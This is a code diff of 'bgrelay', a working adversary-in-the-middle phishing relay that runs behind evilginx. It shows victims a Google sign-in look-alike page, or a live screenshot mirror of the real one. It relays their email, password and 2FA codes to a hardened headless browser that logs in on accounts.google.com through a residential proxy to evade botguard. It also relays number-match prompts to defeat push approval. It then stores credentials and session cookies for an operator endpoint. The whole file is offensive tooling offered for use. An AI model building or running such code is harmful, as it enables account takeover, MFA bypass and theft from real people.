@@ -1,25 +1,27 @@
 #!/usr/bin/env python3
-"""bgrelay — real-browser relay for Google sign-in (botguard-safe architecture).
+"""bgrelay — real-browser relay for Google sign-in (botguard-safe, faithful mirror).
 
-Victim signs in on OUR look-alike page (served through evilginx /__relay/);
-credentials + MFA are relayed in real time to a patchright (hardened CDP
-chromium, headful under Xvfb) sidecar that performs the REAL login on
-accounts.google.com through the residential exit. Botguard always sees a
-genuine browser on the genuine origin, in a session-consistent context —
-on completion we hold the victim's full .google.com session cookies.
+Architecture: the victim page LIVESTREAMS screenshots of the sidecar's REAL
+accounts.google.com page (~1.2s cadence) — everything the victim sees is
+exactly what Google is actually showing (password page, errors, CAPTCHA,
+number-match, challenges). Victim input goes through a minimal relay bar and
+is typed into the sidecar by patchright; the mirror then reflects the result.
 
-Layout:
-  GET  /              victim sign-in page (Google-lookalike, CSD-hardened)
-  POST /api/start     {email}                       -> {id}
-  GET  /api/state?id=                                -> {state, hint, need_input, screenshot?}
+The sidecar is a patchright (hardened-CDP chromium) browser, headful under
+Xvfb, per-victim session, through the residential exit — so Google's botguard
+always sees a genuine browser on the genuine origin (verified to pass).
+
+Endpoints (behind evilginx /__relay/):
+  GET  /              mirror page
+  POST /api/start     {email}                    -> {id}
+  GET  /api/state?id= -> {state, hint, need_input, match_number, screenshot}
   POST /api/input     {id, kind: password|code, value}
-  GET  /api/sessions  (X-Op-Key header)              -> captured sessions (creds+cookies)
+  GET  /api/sessions  (X-Op-Key)                 -> captured sessions
 
-Env: RELAY_SOCKS (socks5 user:pass@host:port), RELAY_PORT (9445),
-     RELAY_BRIDGE_PORT (8119), DISPLAY (:99).
+Env: RELAY_SOCKS (socks5://user:pass@host:port), RELAY_PORT (9445),
+     RELAY_BRIDGE_PORT (8119), RELAY_STORE (~/bgrelay-store).
 """
 
-import base64
 import json
 import os
 import queue
@@ -31,6 +33,7 @@ import sys
 import threading
 import time
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from urllib.parse import urlparse
 
 from patchright.sync_api import sync_playwright
 
@@ -120,7 +123,7 @@ def ensure_xvfb():
     display = os.environ.get("DISPLAY", ":99")
     num = display.lstrip(":").split(".")[0]
     try:
-        subprocess.run(["xdpyinfo", f"-display", f":{num}"], check=True,
+        subprocess.run(["xdpyinfo", "-display", f":{num}"], check=True,
                        capture_output=True, timeout=5)
         return display
     except Exception:
@@ -132,8 +135,6 @@ def ensure_xvfb():
 
 # --------------------------------------------------------------- session ---
 class RelaySession(threading.Thread):
-    STATES = ("init", "password", "password_retry", "challenge", "challenge_wait",
-              "done", "error")
 
     def __init__(self, sid, email):
         super().__init__(daemon=True)
@@ -143,12 +144,14 @@ class RelaySession(threading.Thread):
         self.state = "init"
         self.hint = "Đang mở trang đăng nhập…"
         self.need_input = None          # None | "password" | "code"
-        self.screenshot = None          # b64 png (challenge stage)
+        self.screenshot = None          # b64 jpeg, refreshed ~1.2s
+        self.match_number = None        # 2-digit Google prompt number
         self.error = None
         self.cookies = None
         self.inputs = queue.Queue()
         self.last_active = time.time()
         self.deadline = time.time() + 8 * 60
+        self.finished = False
 
     # -- helpers ------------------------------------------------------------
     def _body(self, pg):
@@ -159,44 +162,70 @@ class RelaySession(threading.Thread):
 
     def _visible(self, pg, sel):
         try:
-            loc = pg.locator(sel).first
-            return loc.is_visible()
+            return pg.locator(sel).first.is_visible()
         except Exception:
             return False
 
-    def _snap(self, pg):
+    def _stream(self, pg):
+        """Refresh the mirror: screenshot + number-match extraction.
+        Called from every poll iteration (~1-2s cadence, single-threaded)."""
         try:
-            self.screenshot = pg.screenshot(type="jpeg", quality=70)
+            self.screenshot = pg.screenshot(type="jpeg", quality=60)
         except Exception:
-            self.screenshot = None
+            pass
+        try:
+            body = self._body(pg)
+            cands = re.findall(r"(?m)^\s*(\d{2})\s*$", body)
+            if not cands:
+                cands = re.findall(r"(?<!\d)(\d{2})(?!\d)", body[:400])
+            if cands and self.state == "challenge":
+                self.match_number = cands[0]
+        except Exception:
+            pass
 
     def _classify(self, pg):
-        """Classify the current sidecar page into a relay state."""
-        from urllib.parse import urlparse
         host = (urlparse(pg.url).hostname or "").lower()
         body = self._body(pg)
         if host in ("mail.google.com", "myaccount.google.com"):
             return "done"
         if self._visible(pg, "input[name='Passwd']") or self._visible(pg, "input[type='password']"):
             return "password"
-        if self._visible(pg, "input[name='totpPin']") or "Enter a code" in body \
-                or "Verify it" in body or "2-Step" in body:
-            return "challenge"
         low = body.lower()
+        if self._visible(pg, "input[name='totpPin']") or "enter a code" in low \
+                or "verify it" in low or "2-step" in low:
+            return "challenge"
         if "couldn" in low and "find" in low:
             return "error_bad_account"
-        if "Wrong password" in body:
+        if "wrong password" in low:
             return "password_retry"
-        if "not be secure" in body:
+        if "not be secure" in low:
             return "error_botguard"
         return None
+
+    def _wait_input(self, pg, kind, hint):
+        """Wait for the victim's input while keeping the mirror streaming."""
+        self.state = kind if kind != "code" else "challenge"
+        self.need_input = kind
+        self.hint = hint
+        remaining = max(1.0, self.deadline - time.time())
+        rounds = int(remaining / 1.2) + 1
+        for _ in range(rounds):
+            try:
+                item = self.inputs.get(timeout=1.2)
+                self.last_active = time.time()
+                return item
+            except queue.Empty:
+                self._stream(pg)
+                if time.time() > self.deadline:
+                    return ("abort", None)
+        return ("abort", None)
 
     def _collect(self, pg):
         out = []
         try:
             for c in pg.context.cookies():
                 dom = c.get("domain", "")
-                if dom.endswith("google.com") or "google.com" in dom:
+                if "google.com" in dom:
                     out.append({"name": c["name"], "value": c["value"],
                                 "domain": dom, "path": c.get("path", "/"),
                                 "expires": c.get("expires", -1)})
@@ -208,6 +237,11 @@ class RelaySession(threading.Thread):
         self.state = state
         self.hint = hint
         self.need_input = None
+        self.finished = True
+        try:
+            self._stream(pg)
+        except Exception:
+            pass
         if state == "done":
             self.cookies = self._collect(pg)
             rec = {"id": self.id, "email": self.email, "password": self.password,
@@ -220,8 +254,7 @@ class RelaySession(threading.Thread):
 
     # -- main loop ----------------------------------------------------------
     def run(self):
-        display = ensure_xvfb()
-        os.environ["DISPLAY"] = display
+        os.environ["DISPLAY"] = ensure_xvfb()
         pw = None
         try:
             pw = sync_playwright().start()
@@ -244,9 +277,8 @@ class RelaySession(threading.Thread):
             st = None
             for i in range(45):
                 time.sleep(1)
+                self._stream(pg)
                 st = self._classify(pg)
-                if i % 5 == 0:
-                    print(f"[dbg {self.id}] t={i}s classify={st} body={self._body(pg)[:200]!r}", flush=True)
                 if st:
                     break
             if st in (None, "error_bad_account", "error_botguard"):
@@ -257,11 +289,9 @@ class RelaySession(threading.Thread):
                 return
             retries = 0
             while time.time() < self.deadline:
-                if st == "password":
-                    self.state = "password"
-                    self.hint = ""
-                    self.need_input = "password"
-                    item = self.inputs.get(timeout=max(1, self.deadline - time.time()))
+                if st in ("password", "password_retry"):
+                    item = self._wait_input(pg, "password",
+                                            "Nhập mật khẩu của tài khoản " + self.email)
                     if item[0] == "abort":
                         break
                     if self.password is None:
@@ -277,35 +307,32 @@ class RelaySession(threading.Thread):
                         if st in ("password", "challenge", "done", "password_retry"):
                             break
                         time.sleep(1)
+                        self._stream(pg)
                         st = self._classify(pg) or st
                     if st == "password_retry":
                         retries += 1
                         if retries >= 3:
                             self._finish(pg, "error", "Quá nhiều lần sai mật khẩu.")
                             break
-                        continue
                 elif st == "challenge":
-                    self.state = "challenge"
                     body = self._body(pg)
-                    if self._visible(pg, "input[name='totpPin']") or "Enter a code" in body:
-                        self.hint = "Nhập mã xác minh"
-                        self.need_input = "code"
-                        self._snap(pg)
-                        item = self.inputs.get(timeout=max(1, self.deadline - time.time()))
+                    if self._visible(pg, "input[name='totpPin']") or "enter a code" in body.lower():
+                        item = self._wait_input(pg, "code", "Nhập mã xác minh")
                         if item[0] == "abort":
                             break
                         sel = "input[name='totpPin']" if self._visible(pg, "input[name='totpPin']") \
                             else "input[type='tel'], input[name='code']"
                         pg.fill(sel, item[1])
-                        pg.click("#totpNext, button:has-text('Next'), div[id='passwordNext']")
+                        pg.click("#totpNext, button:has-text('Next')")
                         time.sleep(5)
                     else:
-                        # Google prompt on phone — no input, wait for approval
-                        self.hint = "Kiểm tra điện thoại của bạn và nhấn phê duyệt (Google prompt)"
+                        # Google prompt / number match — stream until approved
+                        self.state = "challenge"
+                        self.hint = "Phê duyệt trên điện thoại (nhập số hiển thị vào app)"
                         self.need_input = None
-                        self._snap(pg)
                         for _ in range(150):
-                            time.sleep(2)
+                            time.sleep(1.2)
+                            self._stream(pg)
                             st2 = self._classify(pg)
                             if st2 in ("done", "challenge", "password"):
                                 st = st2
@@ -318,14 +345,14 @@ class RelaySession(threading.Thread):
                         if st in ("password", "challenge", "done", "password_retry"):
                             break
                         time.sleep(1)
+                        self._stream(pg)
                         st = self._classify(pg) or st
                 elif st == "done":
                     self._finish(pg, "done", "Đăng nhập thành công")
                     break
-                elif st == "password_retry":
-                    continue  # handled at loop top via password state
                 else:
-                    time.sleep(2)
+                    time.sleep(1.2)
+                    self._stream(pg)
                     st = self._classify(pg) or st
             else:
                 self._finish(pg, "error", "Hết thời gian phiên")
@@ -334,6 +361,7 @@ class RelaySession(threading.Thread):
             self.state = "error"
             self.error = str(e)[:200]
             self.hint = "Lỗi phiên đăng nhập"
+            self.finished = True
             print(f"[error] {self.id}: {e}", flush=True)
         finally:
             if pw:
@@ -349,8 +377,8 @@ LOCK = threading.Lock()
 
 def public_state(s):
     return {"id": s.id, "state": s.state, "hint": s.hint,
-            "need_input": s.need_input,
-            "screenshot": s.screenshot if s.state == "challenge" else None}
+            "need_input": s.need_input, "match_number": s.match_number,
+            "screenshot": s.screenshot}
 
 
 # ------------------------------------------------------------------ page ---
@@ -358,101 +386,74 @@ PAGE = """<!doctype html><html><head><meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
 <title>Sign in - Google Accounts</title>
 <style>
-*{box-sizing:border-box;font-family:arial,sans-serif}
-body{display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#fff;color:#202124}
-.card{width:450px;padding:40px}
-h1{font-size:24px;font-weight:400;margin:0 0 8px}
-.sub{color:#5f6368;font-size:15px;margin-bottom:28px}
-input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;margin:8px 0 24px}
-input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
-.nxt{float:right;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer}
-.nxt:disabled{background:#9aa0a6;cursor:default}
-.err{color:#d93025;font-size:13px;margin-bottom:14px;min-height:16px}
-.logo{margin-bottom:14px}
-.shot{max-width:100%;border:1px solid #dadce0;border-radius:8px;margin:12px 0}
-.egpw{-webkit-text-security:disc}
-#done{text-align:center}
-.spin{width:28px;height:28px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;margin:24px auto;animation:r 1s linear infinite}
-@keyframes r{to{transform:rotate(360deg)}}
+*{box-sizing:border-box;font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif}
+body{margin:0;background:#f8f9fa;color:#202124;display:flex;flex-direction:column;min-height:100vh}
+.wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
+#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:34px;font-weight:600;padding:10px 26px;border-radius:12px;margin-bottom:12px;letter-spacing:6px}
+#live{max-width:1024px;width:100%;height:auto;border:1px solid #dadce0;border-radius:12px;background:#fff;filter:blur(16px);transition:filter .3s}
+#live.on{filter:none}
+#bar{margin-top:14px;display:flex;gap:8px;width:100%;max-width:560px}
+#bar.off{display:none}
+#inp{flex:1;padding:11px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;outline:none;background:#fff}
+#inp:focus{border-color:#0b57d0;box-shadow:0 0 0 1px #0b57d0}
+#inp.egpw{-webkit-text-security:disc}
+#go{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;font-size:14px;cursor:pointer}
+#go:disabled{background:#9aa0a6}
+#st{margin-top:10px;font-size:13px;color:#5f6368;min-height:18px;text-align:center}
+#st.err{color:#d93025}
+.foot{padding:10px 24px;display:flex;justify-content:flex-end;gap:18px;font-size:12px;color:#5f6368;background:#f8f9fa}
 </style></head><body>
-<div class=card>
-<div class=logo id=brand><svg width=40 height=40 viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg></div>
-<div id=stage></div>
+<div class=wrap>
+<div id=num></div>
+<img id=live alt="">
+<div id=bar class=off><input id=inp autocomplete=off><button id=go>Tiếp tục</button></div>
+<div id=st></div>
 </div>
+<div class=foot><span>Help</span><span>Privacy</span><span>Terms</span></div>
 <script>
-var SID=null, brand=document.getElementById('brand');
-brand.style.visibility='hidden';
+var SID=null, live=document.getElementById('live');
 ['pointermove','keydown','touchstart'].forEach(function(ev){
- document.addEventListener(ev,function(){brand.style.visibility='visible';},{once:true,capture:true});});
-function h(s){var d=document.createElement('div');d.innerHTML=s;return d.firstChild;}
-function stageEmail(){
- document.getElementById('stage').innerHTML='';
- var e=document.createElement('h1');e.textContent='Sign in';
- var s=document.createElement('div');s.className='sub';s.textContent='to continue to Gmail';
- var i=document.createElement('input');i.id='em';i.placeholder='Email or phone';i.autocomplete='off';
- var b=document.createElement('button');b.className='nxt';b.textContent='Next';
- var er=document.createElement('div');er.className='err';
- document.getElementById('stage').append(e,s,i,b,er);
- i.focus();
- function go(){if(!i.value||!i.value.includes('@')){er.textContent='Enter an email address';return;}
-  er.textContent='';b.disabled=true;emailCache=i.value;
-  fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:i.value})})
-  .then(r=>r.json()).then(j=>{SID=j.id;stageWaiting('');poll();}).catch(()=>{er.textContent='Network error';b.disabled=false;});}
- b.onclick=go;i.onkeydown=function(k){if(k.key==='Enter')go();};
-}
-function stageWaiting(txt){
- document.getElementById('stage').innerHTML='';
- var w=document.createElement('div');w.className='spin';
- var t=document.createElement('div');t.className='sub';t.id='waitxt';t.textContent=txt||'Signing you in…';
- document.getElementById('stage').append(w,t);
-}
-function stagePassword(retry){
- document.getElementById('stage').innerHTML='';
- var w=document.createElement('h1');w.textContent='Welcome';
- var s=document.createElement('div');s.className='sub';s.textContent=SID?emailCache:'';
- var i=document.createElement('input');i.type='text';i.className='egpw';i.placeholder='Enter your password';i.autocomplete='off';
- var b=document.createElement('button');b.className='nxt';b.textContent='Sign in';
- var er=document.createElement('div');er.className='err';
- if(retry)er.textContent='Wrong password. Try again.';
- document.getElementById('stage').append(w,s,i,b,er);
- i.focus();
- function go(){if(!i.value){er.textContent='Enter a password';return;}
-  er.textContent='';b.disabled=true;stageWaiting('Verifying…');
-  fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:SID,kind:'password',value:i.value})});}
- b.onclick=go;i.onkeydown=function(k){if(k.key==='Enter')go();};
-}
-function stageChallenge(st){
- document.getElementById('stage').innerHTML='';
- var t=document.createElement('h1');t.textContent='2-Step Verification';
- var s=document.createElement('div');s.className='sub';s.textContent=st.hint||'';
- document.getElementById('stage').append(t,s);
- if(st.screenshot){var im=document.createElement('img');im.className='shot';im.src='data:image/jpeg;base64,'+st.screenshot;document.getElementById('stage').append(im);}
- if(st.need_input==='code'){
-  var i=document.createElement('input');i.type='text';i.className='egpw';i.placeholder='Enter code';i.autocomplete='off';
-  var b=document.createElement('button');b.className='nxt';b.textContent='Verify';
-  b.onclick=function(){if(i.value){stageWaiting('Verifying…');
-   fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:SID,kind:'code',value:i.value})});}};
-  i.onkeydown=function(k){if(k.key==='Enter')b.onclick();};
-  document.getElementById('stage').append(i,b);i.focus();
+ document.addEventListener(ev,function(){live.classList.add('on');},{once:true,capture:true});});
+function setSt(t,err){var s=document.getElementById('st');s.textContent=t||'';s.className=err?'err':'';}
+var bar=document.getElementById('bar'), inp=document.getElementById('inp'),
+    go=document.getElementById('go'), numEl=document.getElementById('num');
+var PLACE={password:'Mật khẩu',code:'Mã xác minh',email:'Email'};
+var KIND=null;
+function showInput(kind){KIND=kind;bar.className='';inp.className=kind==='password'?'egpw':'';
+ inp.placeholder=PLACE[kind]||'';inp.value='';inp.focus();}
+function hideInput(){KIND=null;bar.className='off';}
+go.onclick=submit; inp.onkeydown=function(k){if(k.key==='Enter')submit();};
+function submit(){
+ if(!inp.value){return;}
+ if(!SID){ // initial: email -> start session
+  if(!inp.value.includes('@')){setSt('Nhập địa chỉ email',1);return;}
+  go.disabled=true;setSt('Đang kết nối…');
+  fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
+   body:JSON.stringify({email:inp.value})}).then(r=>r.json()).then(j=>{
+    SID=j.id;hideInput();}).catch(()=>{setSt('Lỗi mạng',1);go.disabled=false;});
+  return;
  }
+ go.disabled=true;setSt('Đang xử lý…');
+ fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({id:SID,kind:KIND,value:inp.value})}).then(()=>{hideInput();}).catch(()=>{setSt('Lỗi mạng',1);go.disabled=false;});
 }
-function stageDone(){
- document.getElementById('stage').innerHTML='<div id=done><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><h1>You\\'re signed in</h1><div class="sub">Redirecting to Gmail…</div></div>';
- setTimeout(function(){location.href='https://mail.google.com';},2500);
-}
-var emailCache='';
 function poll(){
- if(!SID)return;
+ if(!SID){setTimeout(poll,900);return;}
  fetch('/__relay/api/state?id='+SID).then(r=>r.json()).then(st=>{
-  if(st.state==='password'||st.state==='password_retry'){stagePassword(st.state==='password_retry');return;}
-  if(st.state==='challenge'){stageChallenge(st);setTimeout(poll, st.need_input==='code'?4000:1600);return;}
-  if(st.state==='done'){stageDone();return;}
-  if(st.state==='error'){stageWaiting(st.hint||'Sign-in failed');return;}
-  var w=document.getElementById('waitxt');if(w&&st.hint)w.textContent=st.hint;
-  setTimeout(poll,1400);
- }).catch(()=>setTimeout(poll,2500));
+  if(st.screenshot){live.src='data:image/jpeg;base64,'+st.screenshot;}
+  if(st.match_number){numEl.style.display='block';numEl.textContent=st.match_number;}
+  else{numEl.style.display='none';}
+  setSt(st.hint&&st.hint.indexOf('Nhập')===0?st.hint:(st.state==='init'?'Đang mở trang đăng nhập…':''));
+  if(st.state==='done'){setSt('Đăng nhập thành công — đang chuyển hướng…');
+   setTimeout(function(){location.href='https://mail.google.com';},2200);return;}
+  if(st.state==='error'){setSt(st.hint||'Không thể đăng nhập',1);return;}
+  if(st.need_input&&!KIND){showInput(st.need_input);go.disabled=false;}
+  else if(!st.need_input&&KIND==='password'&&(st.state==='challenge'||st.state==='done')){hideInput();}
+  setTimeout(poll,1200);
+ }).catch(()=>setTimeout(poll,2000));
 }
-stageEmail();
+showInput('email');
+poll();
 </script></body></html>"""
 
 
@@ -522,10 +523,8 @@ class Handler(BaseHTTPRequestHandler):
             s = SESSIONS.get((data.get("id") or "")[:40])
             if not s:
                 return self._json({"error": "no session"}, 404)
-            kind = data.get("kind")
-            value = (data.get("value") or "")[:200]
             s.last_active = time.time()
-            s.inputs.put((kind, value))
+            s.inputs.put((data.get("kind"), (data.get("value") or "")[:200]))
             return self._json({"ok": True})
         self._json({"error": "not found"}, 404)
 
@@ -536,7 +535,7 @@ def reaper():
         with LOCK:
             for sid in list(SESSIONS):
                 s = SESSIONS[sid]
-                if time.time() - s.last_active > 15 * 60 and not s.is_alive():
+                if s.finished and time.time() - s.last_active > 15 * 60:
                     del SESSIONS[sid]
 
 
